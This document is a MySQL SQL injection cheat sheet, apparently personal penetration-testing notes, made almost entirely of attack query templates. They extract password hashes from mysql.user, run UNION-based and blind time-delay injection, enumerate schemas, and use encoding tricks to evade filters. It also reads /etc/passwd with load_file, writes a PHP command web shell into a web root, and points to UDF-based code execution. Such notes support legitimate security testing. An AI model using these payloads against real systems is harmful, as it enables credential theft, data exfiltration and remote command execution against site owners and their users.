# MySQL

## comments

```
mysql> select 1+1; #comment
mysql> select 1+1; -- mind the space after the double dash!
mysql> select 1 /* inline comment */ + 1;
```

## substring

```
mysql> select substr(password, <offset>, <chars>) from mysql.user where user = <user>;
```

the first character of a string is at *offset* 1

## limit

```
mysql> select host, user, password from mysql.user limit <offset>, <rows>;
```

the first row is at *offset* 0

## determine number of columns in query

```
mysql> ... order by <nr>;
```

increase *nr* until you get an error

## union all

```
mysql> <original query>
union all
select host, user, password [, "4", ..., <nr>] from mysql.user;
```

## conditional errors/delay

```
mysql> select if(
  <condition>,
  sleep(10),
  (select table_name from information_schema.tables)
);
```

trigger a time delay if *condition* is true, or an error otherwise (iff the current DB user doesn't have permission to read from `information_schema`)

## database information

```
mysql> select @@version;
mysql> select version();
mysql> select database(); #current DB
```

## database content

list all schemata (i.e. databases), tables and columns

```
mysql> select schema_name from information_schema.schemata;
mysql> select table_name from information_schema.tables where table_schema = '<database>';
mysql> select column_name from information_schema.columns where table_schema = '<database>' and table_name = '<table>';
```

## read/write files

```
mysql> select load_file('/etc/passwd');
mysql> select 'some text' into outfile 'filename';
```

### PHP backdoor

```
mysql> select "<?php system($_REQUEST['cmd']);?>" into outfile "/path/to/web/root/shell.php"
```

### code execution

if `mysqld` is running as `root`, we can get code execution by uploading a shared object file (i.e. `.so`) that contains a *User Defined Function*.
see [`raptor_udf.c`](http://www.0xdeadbeef.info/exploits/raptor_udf.c) for an explanation and sample UDF. 

## combine columns

```
mysql> select host, concat(user, ':', password) from mysql.user;
```

## filter evasion

```
mysql> select+(password)/*comment*/from`mysql.user`where(user)="<user>";
mysql> select concat('t','e','s','t');
mysql> select 0x41424344; #ABCD
mysql> select char(116,101,115,116); #test
```

## more

* [portswigger.net](https://portswigger.net/web-security/sql-injection/cheat-sheet)
* [pentestmonkey.net](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
